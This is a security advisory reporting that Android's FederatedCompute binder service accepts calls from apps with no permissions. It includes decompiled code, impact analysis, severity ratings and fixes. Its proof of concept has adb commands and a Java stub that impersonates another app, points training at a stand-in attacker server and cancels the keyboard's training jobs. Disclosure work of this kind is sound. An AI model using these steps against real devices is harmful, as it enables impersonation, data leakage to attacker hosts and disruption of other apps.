# VRP Report #43: FederatedCompute Exported Service — Zero-Permission Training Manipulation

## Summary

Android's `FederatedComputeManagingServiceImpl` (package `com.google.android.federatedcompute`) exports an AIDL binder service with **zero permission enforcement** — not in the manifest, not in the service code, and not in the job manager. Any zero-permission app can bind to this service and:

1. **Schedule federated learning training tasks** impersonating any installed app — consuming battery, CPU, and network while connecting to an attacker-controlled server
2. **Cancel any installed app's legitimate training tasks** — disrupting Google's ML training pipeline (Smart Compose, Next Word Prediction, etc.)
3. **Query internal feature flags** — leaking server-side experiment enrollment

## Affected Component

| Component | Value |
|---|---|
| Package | `com.google.android.federatedcompute` |
| Service | `FederatedComputeManagingServiceImpl` |
| Action | `android.federatedcompute.FederatedComputeService` |
| Exported | `true` |
| Permission | **NONE** |
| Module | `com.android.ondevicepersonalization` APEX |
| AIDL Interface | `IFederatedComputeService.Stub` |
| forceQueryable | `true` |

## Root Cause

The service delegate (`FederatedComputeManagingServiceDelegate.java`) extends `IFederatedComputeService.Stub` and exposes three Binder methods. **None of them validate the caller's identity**:

### schedule() — Lines 52-81
```java
public void schedule(final String str, final TrainingOptions trainingOptions,
        final IFederatedComputeCallback iFederatedComputeCallback) {
    // str = caller-supplied "app package name"
    // trainingOptions.getOwnerComponentName().getPackageName() = caller-supplied owner
    // trainingOptions.getServerAddress() = caller-supplied SERVER ADDRESS
    // NO getCallingUid(), NO enforceCallingPermission(), NO checkCallingOrSelfPermission()
    
    String packageName = trainingOptions.getOwnerComponentName().getPackageName();
    // ^ This is whatever the attacker supplies
    
    FederatedComputeJobManager jobManager = this.mInjector.getJobManager(this.mContext);
    FederatedComputeExecutors.getBackgroundExecutor().execute(() -> {
        jobManager.onTrainerStartCalled(str, trainingOptions);
        // Schedules real training job via JobScheduler
    });
}
```

### cancel() — Lines 118-151
```java
public void cancel(final ComponentName componentName, final String str,
        IFederatedComputeCallback iFederatedComputeCallback) {
    // componentName = caller-supplied target app component
    // str = caller-supplied population name
    // NO caller validation — cancels ANY app's training task
    
    FederatedComputeJobManager jobManager = this.mInjector.getJobManager(this.mContext);
    FederatedComputeExecutors.getBackgroundExecutor().execute(() -> {
        jobManager.onTrainerStopCalled(componentName, str);
    });
}
```

### isFeatureEnabled() — Lines 203-210
```java
public void isFeatureEnabled(String str, IIsFeatureEnabledCallback callback) {
    // str = feature name (caller-supplied)
    // Returns internal feature flag status to ANY caller
    FeatureStatusManager.getFeatureStatusAndSendResult(str, ..., callback);
}
```

### Missing Caller Validation — Confirmed by grep

Searching the **entire** decompiled FederatedCompute codebase for any form of caller validation:

```
grep -r "enforceCallingPermission\|checkCallingOrSelf\|getCallingUid\|checkPermission\|enforcePermission" → ZERO RESULTS
```

### isKillSwitchEnabled() Makes It Worse

The only Binder-related call in the service is `Binder.clearCallingIdentity()` (line 191) — which **removes** the caller's identity instead of checking it:

```java
private static boolean isKillSwitchEnabled(...) {
    long jClearCallingIdentity = Binder.clearCallingIdentity();
    // Now running as the FC system service, not the caller
    if (FlagsFactory.getFlags().getGlobalKillSwitch()) { ... }
    Binder.restoreCallingIdentity(jClearCallingIdentity);
    return z;
}
```

### onTrainerStartCalled() Trusts Caller-Supplied Identity

In `FederatedComputeJobManager.java` line 90-95:
```java
public synchronized int onTrainerStartCalled(String str, TrainingOptions trainingOptions) {
    String packageName = trainingOptions.getOwnerComponentName().getPackageName();
    // ^ Attacker-controlled: any installed package name
    
    String certDigest = PackageUtils.getCertDigest(this.mContext, packageName);
    // ^ Gets cert of the CLAIMED package, not the actual caller
    
    // Creates and schedules a real training job:
    FederatedTrainingTask.builder()
        .appPackageName(str)          // attacker-supplied
        .ownerPackageName(packageName) // attacker-supplied
        .serverAddress(trainingOptions.getServerAddress()) // ATTACKER-CONTROLLED SERVER
        .populationName(trainingOptions.getPopulationName())
        .build();
}
```

## Impact

### 1. Battery/Resource Drain (Availability)
A zero-permission app can schedule unlimited federated training jobs, each consuming:
- CPU cycles for model training
- Network bandwidth for server communication
- Battery drain from sustained background processing

The task limit per package (`getFcpTaskLimitPerPackage()`) only limits tasks per CLAIMED owner — the attacker can spread tasks across all installed packages.

### 2. Attacker-Controlled Server Connection (Confidentiality)
The `serverAddress` parameter is fully attacker-controlled. The training job:
- Connects to the specified server address
- Sends device metadata as part of the federated training protocol
- Leaks the device's IP address, connection fingerprint, and potentially training-related metadata
- Could be used for covert C2 channel communication

### 3. Training Task Disruption (Integrity)
Any app can cancel any other app's federated training tasks by calling `cancel()` with the target's ComponentName and populationName. This disrupts:
- Google's ML model improvement pipeline
- Features relying on federated learning (Smart Compose, keyboard predictions, etc.)
- Third-party apps using the Federated Compute API

### 4. Feature Flag Information Disclosure (Confidentiality)
`isFeatureEnabled()` reveals server-side experiment enrollment status, exposing:
- Which features are being A/B tested
- Whether the device is in a test or control group
- Internal feature names and configuration

## Proof of Concept

### Step 1: Verify service is accessible
```bash
# Confirm service exists and is exported with no permission
adb shell dumpsys package com.google.android.federatedcompute | grep -A10 "android.federatedcompute.FederatedComputeService"
# OUTPUT:
#   android.federatedcompute.FederatedComputeService:
#     FederatedComputeManagingServiceImpl filter ...
#       Action: "android.federatedcompute.FederatedComputeService"

# Start the service (succeeds from any context)
adb shell am start-foreground-service -a "android.federatedcompute.FederatedComputeService"
# OUTPUT: Starting service: Intent { act=android.federatedcompute.FederatedComputeService }
```

### Step 2: PoC App (zero permissions)
```java
// PoC binds to the FederatedCompute service and calls schedule()
// to impersonate another app and connect to attacker's server
Intent intent = new Intent("android.federatedcompute.FederatedComputeService");
intent.setPackage("com.google.android.federatedcompute");
bindService(intent, new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        // service is IFederatedComputeService.Stub
        // Call schedule() with:
        //   appPackageName = "com.google.android.gms" (impersonation)
        //   ownerComponentName = ComponentName("com.google.android.gms", "SomeClass")
        //   populationName = "attacker_population"
        //   serverAddress = "https://attacker-controlled-server.com" 
        //   trainingInterval with immediate scheduling
        
        // Call cancel() to disrupt another app:
        //   componentName = ComponentName("com.google.android.inputmethod.latin", "TrainerService")
        //   populationName = "keyboard_next_word_prediction"
    }
}, Context.BIND_AUTO_CREATE);
```

### Step 3: Dynamic Confirmation
```bash
# Confirm service can be started from unprivileged context
adb shell am start-foreground-service -a "android.federatedcompute.FederatedComputeService"
# Result: Starting service: Intent { act=android.federatedcompute.FederatedComputeService }
# No SecurityException, no permission denied
```

## Severity Assessment

| Factor | Assessment |
|---|---|
| Attack Vector | Local (installed app) |
| Attack Complexity | LOW |
| Privileges Required | NONE (zero permissions) |
| User Interaction | NONE |
| Confidentiality | LOW (IP leak via server, feature flags) |
| Integrity | MEDIUM (cancel legitimate training) |
| Availability | MEDIUM (battery/resource drain) |

## Recommended Fix

1. **Add permission to service declaration**:
```xml
<service android:exported="true"
    android:name="...FederatedComputeManagingServiceImpl"
    android:permission="android.permission.BIND_FEDERATED_COMPUTE_SERVICE">
```

2. **Validate caller identity in schedule()/cancel()**:
```java
int callingUid = Binder.getCallingUid();
String[] callingPackages = getContext().getPackageManager()
    .getPackagesForUid(callingUid);
// Verify callingPackages matches the claimed ownerPackageName
```

3. **Validate serverAddress against allowlist** (e.g., `*.googleapis.com`)

## Device / Build
- Pixel Watch 2 (3A101RTJWRGCV9), Wear OS, Build CP2A.260603.001
- com.google.android.federatedcompute — part of com.android.ondevicepersonalization APEX
- Also present on Pixel 6a, Android 17 (API 37), Build CP2A.260605.012

## Source Files
- Manifest: `deep_analysis/federated_apktool/AndroidManifest.xml`
- Service Delegate: `deep_analysis/federated_decompiled/sources/com/android/federatedcompute/services/FederatedComputeManagingServiceDelegate.java`
- Job Manager: `deep_analysis/federated_decompiled/sources/com/android/federatedcompute/services/scheduling/FederatedComputeJobManager.java`
